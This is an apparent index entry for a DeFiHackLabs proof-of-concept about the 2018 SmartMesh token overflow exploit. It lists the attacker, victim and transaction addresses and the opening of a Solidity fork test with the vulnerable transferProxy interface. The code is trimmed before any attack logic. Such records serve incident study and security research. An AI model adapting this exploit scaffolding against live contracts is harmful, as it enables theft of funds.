# [?] SmartMesh - Overflow

## Summary
Severity: Unknown
Chain: Ethereum
Component: SmartMesh
Published: 2018-04-24
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2018-04/SmartMesh_exp.sol
Type: defi-exploit-poc

## Details
Lost: 140M

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";

// @KeyInfo - Total Lost : 140M
// Attacker : https://etherscan.io/address/0xd6a09bdb29e1eafa92a30373c44b09e2e2e0651e
// Vulnerable Contract : https://etherscan.io/address/0x55f93985431fc9304077687a35a1ba103dc1e081
// Attack Tx : https://etherscan.io/tx/0x1abab4c8db9a30e703114528e31dee129a3a758f7f8abc3b6494aad3d304e43f

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x55f93985431fc9304077687a35a1ba103dc1e081#code

// @Analysis
// Post-mortem : https://cryptojobslist.com/blog/two-vulnerable-erc20-contracts-deep-dive-beautychain-smartmesh
// Twitter Guy :
// Hacking God :
pragma solidity ^0.8.0;

interface ISmartMesh {
    function transferProxy(
        address _from,
        address _to,
        uint256 _value,
        uint256 _feeSmt,
        uint8 _v,
        bytes32 _r,
        bytes32 _s
    ) external returns (bool);
}

contract SmartMesh is BaseTestWithBalanceLog {
    uint256 blocknumToForkFrom = 5_499_034;

    address internal Victim = 0x55F93985431Fc9304077687a35A1BA103dC1e081;
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2018-04/SmartMesh_exp.sol_
